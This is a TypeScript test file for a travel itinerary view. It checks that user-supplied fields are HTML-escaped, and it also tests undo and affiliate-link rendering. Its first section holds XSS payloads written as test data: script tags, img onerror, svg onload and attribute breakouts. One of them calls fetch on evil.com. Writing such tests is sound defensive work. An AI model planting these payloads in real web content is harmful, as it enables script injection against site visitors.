import { describe, it, expect, vi, beforeEach } from 'vitest'
import type { Stop, CulinaryRegion, Accommodation, Itinerary } from '../types'
import { ItineraryView } from './ItineraryView'

// Mock IntersectionObserver which is not available in test environment
global.IntersectionObserver = class IntersectionObserver {
  constructor() {}
  disconnect() {}
  observe() {}
  unobserve() {}
  takeRecords() {
    return []
  }
} as any

describe('ItineraryView XSS Prevention', () => {
  let view: ItineraryView
  let container: HTMLDivElement

  beforeEach(() => {
    document.body.innerHTML = `
      <div id="route-summary"></div>
      <div id="filter-chips"></div>
      <div id="selected-stop"></div>
      <div id="timeline"></div>
      <div id="cul-grid"></div>
      <div id="accom-tbody"></div>
      <div id="itinerary"></div>
    `
    container = document.body

    view = new ItineraryView(
      vi.fn(),
      vi.fn(),
    )
  })

  it('escapes malicious stop destinations in timeline', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: '<img src=x onerror=alert(1)>',
        region: '<script>alert("XSS")</script>',
        coords: [0, 0] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Normal description',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    expect(timeline?.innerHTML).not.toContain('<img src=x')
    expect(timeline?.innerHTML).not.toContain('<script>')
    expect(timeline?.innerHTML).toContain('&lt;img')
    expect(timeline?.innerHTML).toContain('&lt;script&gt;')
  })

  it('escapes malicious highlights in timeline', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe description',
        highlights: [
          'Visit the castle',
          '"><script>alert(1)</script><span x="',
          '<img src=x onerror="fetch(\'https://evil.com\')">"',
        ],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    const highlights = timeline?.querySelectorAll('.card-highlights li')
    expect(highlights?.length).toBe(3)
    expect(highlights?.[1]?.innerHTML).not.toContain('<script>')
    expect(highlights?.[1]?.innerHTML).toContain('&lt;script&gt;')
    expect(highlights?.[2]?.innerHTML).not.toContain('<img')
    expect(highlights?.[2]?.innerHTML).toContain('&lt;img')
  })

  it('escapes malicious culinary descriptions', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    const culinary: CulinaryRegion[] = [
      {
        icon: '🍴',
        name: '<img src=x onerror=alert(1)>',
        region: 'Scania">alert(1)</div><div x="',
        desc: '<script>alert("food XSS")</script>',
        must: ['Meatballs', '"><script>alert(1)</script>'],
        color: 'rgb(0,0,0)',
      },
    ]

    view.render(stops, culinary, [])

    const grid = document.getElementById('cul-grid')
    expect(grid?.innerHTML).not.toContain('<img src=x')
    expect(grid?.innerHTML).not.toContain('<script>')
    expect(grid?.innerHTML).toContain('&lt;img')
    expect(grid?.innerHTML).toContain('&lt;script&gt;')

    const mustList = grid?.querySelector('.cul-list')
    expect(mustList?.innerHTML).not.toContain('<script>')
    expect(mustList?.innerHTML).toContain('&lt;script&gt;')
  })

  it('escapes malicious accommodation details', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    const accommodations: Accommodation[] = [
      {
        dest: '<img src=x onerror=alert(1)>',
        type: 'Hotel"><script>alert(1)</script>',
        policy: 'free',
        bath: true,
        terrace: false,
        note: '<svg onload=alert(1)>',
      },
    ]

    view.render(stops, [], accommodations)

    const tbody = document.getElementById('accom-tbody')
    const cells = tbody?.querySelectorAll('td')
    expect(tbody?.innerHTML).not.toContain('<img src=x')
    expect(tbody?.innerHTML).not.toContain('<script>')
    expect(tbody?.innerHTML).not.toContain('<svg')
    expect(tbody?.innerHTML).toContain('&lt;img')
    expect(tbody?.innerHTML).toContain('&lt;svg')
  })

  it('escapes malicious from city in route info', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: '"><script>alert(1)</script>',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    expect(timeline?.innerHTML).not.toContain('<script>')
    expect(timeline?.innerHTML).toContain('&lt;script&gt;')
  })

  it('renders XSS payload in tagLabel as inert text (Issue 1)', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: ['"><img src=x onerror=alert(1)>'],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const tspan = document.querySelector('.tags span')

    // Tag text should contain the payload but as plain text (not an executable img tag)
    expect(tspan?.textContent).toContain('img')
    expect(tspan?.textContent).toContain('onerror')
    // The textContent should NOT have been parsed as HTML - no child img elements
    expect(tspan?.querySelector('img')).toBeNull()

    // Tag in class attribute should be sanitized (only alphanumerics and hyphens)
    const classList = tspan?.className || ''
    expect(classList).toMatch(/^tag tag-[a-z0-9-]*$/)
  })

  it('escapes tag in data-tags attribute (Issue 3)', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: ['nature', 'culture'],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    const tItem = timeline?.querySelector('.t-item')
    const dataTags = tItem?.getAttribute('data-tags') || ''

    // Verify that data-tags still contains the tags in the right format
    expect(dataTags).toContain('nature')
    expect(dataTags).toContain('culture')

    // Test filtering still works
    const mockFilterCallback = vi.fn()
    const view2 = new ItineraryView(mockFilterCallback, vi.fn())
    view2.render(stops, [], [])
    view2.setFilter('nature')

    // Verify filtering logic (reads from data-tags attribute)
    const visibleItems = timeline?.querySelectorAll('.t-item:not(.hidden)')
    expect(visibleItems?.length).toBeGreaterThan(0)
  })

  it('escapes XSS payload in tpl() parameters (Issue 2)', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: '<script>alert("XSS")</script>',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: '<img src=x onerror=alert(1)>',
        km: 500,
        time: '5h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    // Check route-summary for escaped longestDrive.dest in tpl() output
    const summary = document.getElementById('route-summary')
    expect(summary?.innerHTML).not.toContain('<script>')
    expect(summary?.innerHTML).toContain('&lt;script&gt;')
  })
})

describe('ItineraryView undo-last-edit button (#51)', () => {
  let onUndo: ReturnType<typeof vi.fn>

  function aValidItinerary(overrides: Partial<Itinerary> = {}): Itinerary {
    return {
      title: 'Roadtrip till Malmö',
      totalDays: 3,
      startCity: 'Malmö',
      endCity: 'Västra Götaland',
      generatedAt: '2026-06-01T00:00:00.000Z',
      stops: [
        {
          day: 1,
          city: 'Malmö',
          region: 'Skåne',
          lat: 55.605,
          lng: 13.0038,
          nights: 2,
          highlights: ['Gärdet'],
          accommodation: 'Hotel Malmö',
          culinaryNotes: 'Try the smörgåsbord',
        },
      ],
      ...overrides,
    }
  }

  const baselineStops: Stop[] = [
    {
      id: 1,
      days: '1',
      dates: '2026-06-10',
      dest: 'Malmö',
      region: 'Skåne',
      coords: [13.0038, 55.605] as [number, number],
      tags: [],
      nights: 1,
      desc: '',
      highlights: [],
      from: '',
      km: 0,
      time: '',
      zoom: 12,
      pitch: 45,
      bearing: 0,
    },
  ]

  beforeEach(() => {
    document.body.innerHTML = `
      <div id="route-summary"></div>
      <div id="filter-chips"></div>
      <div id="selected-stop"></div>
      <div id="timeline"></div>
      <div id="cul-grid"></div>
      <div id="accom-tbody"></div>
      <div id="itinerary"><div class="section-wrap"></div></div>
    `
    onUndo = vi.fn()
  })

  it('is hidden until the loaded itinerary has a previous version, then calls the undo callback on click', () => {
    const view = new ItineraryView(vi.fn(), vi.fn(), vi.fn(), vi.fn(), undefined, onUndo)
    view.render(baselineStops, [], [])

    const undoBtn = document.getElementById('btn-undo-last-edit') as HTMLButtonElement
    expect(undoBtn).toBeTruthy()
    expect(undoBtn.classList.contains('hidden')).toBe(true)

    view.renderFromItinerary(aValidItinerary({ hasPreviousVersion: true }))
    expect(undoBtn.classList.contains('hidden')).toBe(false)

    undoBtn.click()
    expect(onUndo).toHaveBeenCalledOnce()
  })

  it('hides again once hasPreviousVersion is false (e.g. after an undo)', () => {
    const view = new ItineraryView(vi.fn(), vi.fn(), vi.fn(), vi.fn(), undefined, onUndo)
    view.render(baselineStops, [], [])
    view.renderFromItinerary(aValidItinerary({ hasPreviousVersion: true }))

    const undoBtn = document.getElementById('btn-undo-last-edit') as HTMLButtonElement
    expect(undoBtn.classList.contains('hidden')).toBe(false)

    view.setHasPreviousVersion(false)
    expect(undoBtn.classList.contains('hidden')).toBe(true)
  })

  it('reflects hasPreviousVersion via setHasPreviousVersion without a full re-render', () => {
    const view = new ItineraryView(vi.fn(), vi.fn(), vi.fn(), vi.fn())
    view.render(baselineStops, [], [])
    view.renderFromItinerary(aValidItinerary({ hasPreviousVersion: false }))

    const undoBtn = document.getElementById('btn-undo-last-edit') as HTMLButtonElement
    expect(undoBtn.classList.contains('hidden')).toBe(true)

    view.setHasPreviousVersion(true)
    expect(undoBtn.classList.contains('hidden')).toBe(false)
  })

  it('marks day-trip stops with t-item--daytrip class and shows base city', () => {
    const dayTripView = new ItineraryView(
      vi.fn(),
      vi.fn(),
    )

    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Göteborg',
        region: 'Västra Götaland',
        coords: [11.97, 57.71] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Overnight base',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
      {
        id: 2,
        days: '2',
        dates: '2026-06-11',
        dest: 'Fjällbacka',
        region: 'Bohuslän',
        coords: [11.20, 58.45] as [number, number],
        tags: [],
        nights: 0,
        desc: 'Day trip destination',
        highlights: [],
        from: 'Göteborg',
        km: 75,
        time: '1.5h',
        zoom: 13,
        pitch: 30,
        bearing: 0,
      },
    ]

    dayTripView.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    const dayTripItem = timeline?.querySelector('.t-item--daytrip')
    const overnightItem = timeline?.querySelector('.t-item:not(.t-item--daytrip)')

    expect(dayTripItem).toBeTruthy()
    expect(overnightItem).toBeTruthy()
    expect(dayTripItem?.innerHTML).toContain('◇')
    expect(dayTripItem?.innerHTML).toContain('Day trip')
    expect(dayTripItem?.innerHTML).toContain('Göteborg')
  })
})

describe('ItineraryView lodging affiliate link (#70)', () => {
  beforeEach(() => {
    document.body.innerHTML = `
      <div id="route-summary"></div>
      <div id="filter-chips"></div>
      <div id="selected-stop"></div>
      <div id="timeline"></div>
      <div id="cul-grid"></div>
      <div id="accom-tbody"></div>
      <div id="itinerary"></div>
    `
  })

  function aStop(overrides: Partial<Stop> = {}): Stop {
    return {
      id: 1,
      days: '1',
      dates: '2026-06-10',
      dest: 'Malmö',
      region: 'Skåne',
      coords: [13.0038, 55.605] as [number, number],
      tags: [],
      nights: 2,
      desc: 'Overnight base',
      highlights: ['Gärdet'],
      from: 'Amsterdam',
      km: 100,
      time: '2h',
      zoom: 12,
      pitch: 45,
      bearing: 0,
      ...overrides,
    }
  }

  it('renders a lodging link on overnight cards with the encoded city in the href', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render([aStop({ dest: 'Malmö', nights: 2 })], [], [])

    const link = document.querySelector<HTMLAnchorElement>('a.card-lodging-link')
    expect(link).toBeTruthy()
    expect(link?.getAttribute('href')).toContain('Malm%C3%B6')
    expect(link?.getAttribute('target')).toBe('_blank')
    expect(link?.getAttribute('rel')).toBe('noopener nofollow sponsored')
    expect(link?.getAttribute('data-affiliate')).toBe('lodging')
    expect(link?.textContent).toContain('Malmö')
  })

  it('encodes Norwegian ø in the href (Tromsø)', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render([aStop({ dest: 'Tromsø', nights: 1 })], [], [])

    const link = document.querySelector<HTMLAnchorElement>('a.card-lodging-link')
    expect(link?.getAttribute('href')).toContain('Troms%C3%B8')
  })

  it('does NOT render a lodging link on day-trip cards (nights === 0)', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render(
      [
        aStop({ id: 1, dest: 'Göteborg', nights: 2 }),
        aStop({ id: 2, dest: 'Fjällbacka', nights: 0, from: 'Göteborg' }),
      ],
      [],
      [],
    )

    const links = document.querySelectorAll('a.card-lodging-link')
    expect(links.length).toBe(1)
    const dayTripCard = document.getElementById('stop-2')
    expect(dayTripCard?.querySelector('a.card-lodging-link')).toBeNull()
  })

  it('escapes a malicious dest in both the href attribute and the link text', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render([aStop({ dest: 'Malmö"><script>alert(1)</script>', nights: 2 })], [], [])

    const timeline = document.getElementById('timeline')
    expect(timeline?.innerHTML).not.toContain('<script>')
    // The anchor must exist and its href must not have been broken out of
    const link = document.querySelector<HTMLAnchorElement>('a.card-lodging-link')
    expect(link).toBeTruthy()
    expect(link?.getAttribute('data-affiliate')).toBe('lodging')
    // No stray script element injected anywhere
    expect(document.querySelector('script')).toBeNull()
  })

  it('renders an & in the city single-escaped, not as &amp;amp; (tpl already escapes params)', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render(
      [
        aStop({ id: 1, dest: 'Karlstad & Värmland', nights: 2 }),
        aStop({ id: 2, dest: 'Mårbacka & Rottneros', nights: 0 }),
      ],
      [],
      [],
    )

    const link = document.querySelector<HTMLAnchorElement>('a.card-lodging-link')
    expect(link?.textContent).toContain('Karlstad & Värmland')
    expect(link?.textContent).not.toContain('&amp;')

    const dayTripBase = document.querySelector<HTMLElement>('.daytrip-base')
    expect(dayTripBase?.textContent).toContain('Karlstad & Värmland')
    expect(dayTripBase?.textContent).not.toContain('&amp;')
  })

  it('does not trigger stop selection when the lodging link is clicked', () => {
    const onStopSelect = vi.fn()
    const view = new ItineraryView(vi.fn(), onStopSelect)
    view.render([aStop({ dest: 'Västerås', nights: 2 })], [], [])
    // render() auto-selects the first stop; only clicks after that are under test
    onStopSelect.mockClear()

    const link = document.querySelector<HTMLAnchorElement>('a.card-lodging-link')
    expect(link).toBeTruthy()
    link?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
    expect(onStopSelect).not.toHaveBeenCalled()

    // A click elsewhere on the card still selects the stop
    const card = document.querySelector<HTMLElement>('.t-card .card-desc')
    card?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
    expect(onStopSelect).toHaveBeenCalledOnce()
  })
})

describe('ItineraryView activity affiliate link on day-trip cards (#71)', () => {
  beforeEach(() => {
    document.body.innerHTML = `
      <div id="route-summary"></div>
      <div id="filter-chips"></div>
      <div id="selected-stop"></div>
      <div id="timeline"></div>
      <div id="cul-grid"></div>
      <div id="accom-tbody"></div>
      <div id="itinerary"></div>
    `
  })

  function aStop(overrides: Partial<Stop> = {}): Stop {
    return {
      id: 1,
      days: '1',
      dates: '2026-06-10',
      dest: 'Malmö',
      region: 'Skåne',
      coords: [13.0038, 55.605] as [number, number],
      tags: [],
      nights: 2,
      desc: 'Overnight base',
      highlights: ['Gärdet'],
      from: 'Amsterdam',
      km: 100,
      time: '2h',
      zoom: 12,
      pitch: 45,
      bearing: 0,
      ...overrides,
    }
  }

  it('renders an activity link on day-trip cards with the encoded city in the href', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render(
      [
        aStop({ id: 1, dest: 'Göteborg', nights: 2 }),
        aStop({ id: 2, dest: 'Fjällbacka', nights: 0, from: 'Göteborg' }),
      ],
      [],
      [],
    )

    const link = document.querySelector<HTMLAnchorElement>('a.card-activity-link')
    expect(link).toBeTruthy()
    expect(link?.getAttribute('href')).toContain('Fj%C3%A4llbacka')
    expect(link?.getAttribute('target')).toBe('_blank')
    expect(link?.getAttribute('rel')).toBe('noopener nofollow sponsored')
    expect(link?.getAttribute('data-affiliate')).toBe('activity')
    expect(link?.textContent).toContain('Fjällbacka')
  })

  it('encodes Norwegian ø in the href (Tromsø)', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render(
      [
        aStop({ id: 1, dest: 'Ängelholm', nights: 1 }),
        aStop({ id: 2, dest: 'Tromsø', nights: 0, from: 'Ängelholm' }),
      ],
      [],
      [],
    )

    const link = document.querySelector<HTMLAnchorElement>('a.card-activity-link')
    expect(link?.getAttribute('href')).toContain('Troms%C3%B8')
  })

  it('gives every card exactly one affiliate row: lodging on overnight, activity on day trip', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render(
      [
        aStop({ id: 1, dest: 'Göteborg', nights: 2 }),
        aStop({ id: 2, dest: 'Fjällbacka', nights: 0, from: 'Göteborg' }),
      ],
      [],
      [],
    )

    const overnightCard = document.getElementById('stop-1')
    const dayTripCard = document.getElementById('stop-2')
    expect(overnightCard?.querySelectorAll('a[data-affiliate]').length).toBe(1)
    expect(overnightCard?.querySelector('a.card-lodging-link')).toBeTruthy()
    expect(overnightCard?.querySelector('a.card-activity-link')).toBeNull()
    expect(dayTripCard?.querySelectorAll('a[data-affiliate]').length).toBe(1)
    expect(dayTripCard?.querySelector('a.card-activity-link')).toBeTruthy()
    expect(dayTripCard?.querySelector('a.card-lodging-link')).toBeNull()
  })

  it('escapes a malicious day-trip dest in both the href attribute and the link text', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render(
      [
        aStop({ id: 1, dest: 'Göteborg', nights: 2 }),
        aStop({ id: 2, dest: 'Fjällbacka"><script>alert(1)</script>', nights: 0, from: 'Göteborg' }),
      ],
      [],
      [],
    )

    const timeline = document.getElementById('timeline')
    expect(timeline?.innerHTML).not.toContain('<script>')
    const link = document.querySelector<HTMLAnchorElement>('a.card-activity-link')
    expect(link).toBeTruthy()
    expect(link?.getAttribute('data-affiliate')).toBe('activity')
    expect(document.querySelector('script')).toBeNull()
  })

  it('renders an & in the day-trip city single-escaped, not as &amp;amp;', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render(
      [
        aStop({ id: 1, dest: 'Karlstad & Värmland', nights: 2 }),
        aStop({ id: 2, dest: 'Mårbacka & Rottneros', nights: 0, from: 'Karlstad & Värmland' }),
      ],
      [],
      [],
    )

    const link = document.querySelector<HTMLAnchorElement>('a.card-activity-link')
    expect(link?.textContent).toContain('Mårbacka & Rottneros')
    expect(link?.textContent).not.toContain('&amp;')
  })

  it('does not trigger stop selection when the activity link is clicked', () => {
    const onStopSelect = vi.fn()
    const view = new ItineraryView(vi.fn(), onStopSelect)
    view.render(
      [
        aStop({ id: 1, dest: 'Göteborg', nights: 2 }),
        aStop({ id: 2, dest: 'Fjällbacka', nights: 0, from: 'Göteborg' }),
      ],
      [],
      [],
    )
    // render() auto-selects the first stop; only clicks after that are under test
    onStopSelect.mockClear()

    const link = document.querySelector<HTMLAnchorElement>('a.card-activity-link')
    expect(link).toBeTruthy()
    link?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
    expect(onStopSelect).not.toHaveBeenCalled()

    // A click elsewhere on the day-trip card still selects the stop
    const desc = document.querySelector<HTMLElement>('#stop-2 .card-desc')
    desc?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
    expect(onStopSelect).toHaveBeenCalledOnce()
  })
})

describe('ItineraryView trip-index car-rental link (#72)', () => {
  beforeEach(() => {
    document.body.innerHTML = `
      <div id="route-summary"></div>
      <div id="filter-chips"></div>
      <div id="selected-stop"></div>
      <div id="timeline"></div>
      <div id="trip-index"></div>
      <div id="cul-grid"></div>
      <div id="accom-tbody"></div>
      <div id="itinerary"></div>
    `
  })

  function aStop(overrides: Partial<Stop> = {}): Stop {
    return {
      id: 1,
      days: '1',
      dates: '2026-06-10',
      dest: 'Malmö',
      region: 'Skåne',
      coords: [13.0038, 55.605] as [number, number],
      tags: [],
      nights: 2,
      desc: 'Overnight base',
      highlights: ['Gärdet'],
      from: 'Amsterdam',
      km: 100,
      time: '2h',
      zoom: 12,
      pitch: 45,
      bearing: 0,
      ...overrides,
    }
  }

  it('renders one trip-level rent-car link in the trip index after the stop list', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render(
      [aStop({ id: 1, dest: 'Fjällbacka', nights: 2 }), aStop({ id: 2, dest: 'Tromsø', nights: 1 })],
      [],
      [],
    )

    const index = document.getElementById('trip-index')
    const links = index?.querySelectorAll<HTMLAnchorElement>('a.trip-index-rentcar')
    expect(links?.length).toBe(1)
    const link = links?.[0]
    expect(link?.getAttribute('href')).toContain('https://www.discovercars.com/')
    expect(link?.getAttribute('target')).toBe('_blank')
    expect(link?.getAttribute('rel')).toBe('noopener nofollow sponsored')
    expect(link?.getAttribute('data-affiliate')).toBe('car-rental')
    expect(link?.textContent).toContain('Rent a car')
    // Trip-level link lives after the stop list, outside any .trip-index-link button
    const ul = index?.querySelector('.trip-index-list')
    expect(ul?.querySelector('a.trip-index-rentcar')).toBeNull()
    expect(ul && link ? ul.compareDocumentPosition(link) & Node.DOCUMENT_POSITION_FOLLOWING : 0).toBeTruthy()
  })

  it('does not render a rent-car link when there are no stops', () => {
    // render() itself requires at least one stop (renderRouteTools assumes stops[0]),
    // so exercise renderTripIndex's own empty-stops early-return directly.
    const view = new ItineraryView(vi.fn(), vi.fn())
    ;(view as unknown as { stops: Stop[] }).stops = []
    ;(view as unknown as { renderTripIndex(): void }).renderTripIndex()

    expect(document.getElementById('trip-index')?.innerHTML).toBe('')
    expect(document.querySelector('a.trip-index-rentcar')).toBeNull()
  })

  it('clicking the rent-car link does not change stop selection, and index buttons still work', () => {
    const view = new ItineraryView(vi.fn(), vi.fn())
    view.render(
      [aStop({ id: 1, dest: 'Ängelholm', nights: 2 }), aStop({ id: 2, dest: 'Västerås', nights: 1 })],
      [],
      [],
    )

    const selected = document.getElementById('selected-stop')
    expect(selected?.textContent).toContain('Ängelholm')

    // Clicking the rent-car link must not hijack the trip-index button delegation
    const link = document.querySelector<HTMLAnchorElement>('a.trip-index-rentcar')
    link?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
    expect(selected?.textContent).toContain('Ängelholm')
    expect(selected?.textContent).not.toContain('Västerås')

    // The trip-index stop buttons still select their stop
    const secondBtn = document.querySelectorAll<HTMLButtonElement>('.trip-index-link')[1]
    secondBtn?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
    expect(selected?.textContent).toContain('Västerås')
  })
})
